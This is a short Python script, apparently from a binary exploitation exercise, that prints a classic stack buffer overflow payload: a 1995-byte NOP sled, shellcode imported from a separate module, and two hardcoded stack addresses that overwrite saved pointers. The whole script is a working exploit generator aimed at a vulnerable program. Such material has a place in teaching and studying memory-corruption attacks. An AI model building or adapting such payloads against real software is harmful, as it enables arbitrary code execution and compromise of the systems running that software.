from shellcode import shellcode
import struct

a_addr = struct.pack("@I",0xbfffde40)
p_addr = struct.pack("@I",0xbfffe64c)
nop="\x90"
print(nop*1995 + shellcode + a_addr + p_addr )
